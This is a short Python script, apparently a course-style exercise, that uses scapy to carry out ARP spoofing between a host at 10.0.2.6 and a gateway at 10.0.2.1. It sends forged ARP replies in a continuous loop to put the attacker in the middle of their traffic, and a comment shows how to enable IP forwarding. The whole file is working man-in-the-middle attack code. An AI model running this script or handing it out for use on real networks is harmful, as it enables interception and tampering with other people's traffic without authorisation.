#! /usr/bin/env python

#Python3

import time
import scapy.all as scapy

# set port forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())

    # scapy.send(packet, verbose=False)


restore("10.0.2.6", "10.0.2.1")


try:
    sent_packets_count = 0
    while True:
        spoof("10.0.2.6", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.6")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\r[+] Detected CTRL + C ..... Quitting")
